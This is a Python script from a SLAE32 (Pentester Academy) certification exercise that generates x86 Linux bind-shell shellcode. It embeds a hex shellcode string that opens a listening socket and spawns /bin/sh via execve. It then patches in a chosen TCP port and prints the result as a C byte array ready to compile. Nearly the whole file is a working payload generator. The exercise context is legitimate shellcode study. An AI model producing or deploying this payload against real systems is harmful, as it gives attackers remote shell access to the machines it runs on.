#!/usr/bin/python3

'''
	Jean-Pierre LESUEUR
	@DarkCoderSc

	jplesueur@phrozen.io
	https://www.phrozen.io

	***
	SLAE32 Certification Exercise N°1
 	(Pentester Academy).
 	https://www.pentesteracademy.com
	***

	Description:

 	This python script will generate the final payload with desired TCP port number.
'''

import socket
import sys
from textwrap import wrap

shellcode = (
				"\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2"
				"\\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83"
				"\\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6"
				"\\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02"
				"\\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66"
				"\\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2"
				"\\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10"
				"\\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0"
				"\\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0"
				"\\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66"
				"\\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9"
				"\\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73"
				"\\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec"
				"\\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
			)

if len(sys.argv) != 2:
	print("Usage: ./gen_bindshell.py <port_number>")
else:
	tcp_port = int(sys.argv[1])

	if (tcp_port > 65535) or (tcp_port < 0):
		print("Invalid port number (0..65535)")
	else:
		#
		# Format port 
		#

		raw_port = ('{:04x}'.format(socket.htons(tcp_port)))		

		raw_port_1 = "\\x{}".format(raw_port[2:4])
		raw_port_2 = "\\x{}".format(raw_port[:2])			
		
		#
		# Modify existing shellcode (hundred of possibilities)		
		#

		if raw_port_1 == "\\x00":
			shellcode = shellcode.replace("\\xb0\\x01", "") 			
		else:
			shellcode = shellcode.replace("\\xb0\\x01", "\\xb0{}".format(raw_port_1)) 
			
		shellcode = shellcode.replace("\\xb4\\xbb", "\\xb4{}".format(raw_port_2))


		#shellcode = shellcode.replace("\\x01\\xbb", patch)

		final_payload = "// Shellcode size = {}\n".format(int(len(shellcode) / 4))
		final_payload += "unsigned char code[] = \\\n"

		for l in wrap(shellcode, 64):
			final_payload += "\t\"{}\"\n".format(l)

		final_payload = final_payload[:-1] + ";"

		print(final_payload)